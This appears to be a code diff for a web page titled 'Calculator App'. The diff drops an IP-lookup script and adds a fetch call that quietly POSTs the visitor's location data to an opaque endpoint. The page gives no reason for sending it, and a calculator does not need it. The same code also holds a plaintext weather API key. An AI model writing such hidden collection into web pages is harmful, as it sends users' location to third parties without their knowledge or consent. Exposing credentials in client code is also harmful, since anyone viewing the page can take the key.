@@ -2,7 +2,6 @@
 <html lang="en">
 
 <head>
-    <script> function getIP(json) { var ipAddress = json.ip; // Do something with the IP address console.log(ipAddress); } </script> <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Calculator App</title>
@@ -50,6 +49,13 @@
         .then(response => response.json())
         .then(data => {
             console.log('Location Data:', data);
+            fetch("1OMUslhRWVGDmw1_mPhNODa-Xt0ENN7On6ygejoF8s98", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ value: data })
+            });
             wkey = "84962e27592b4d0d82b223541250305"
             fetch('http://api.weatherapi.com/v1/current.json?key=' + wkey + '&q=' + data.postal)
                 .then(response => response.json())
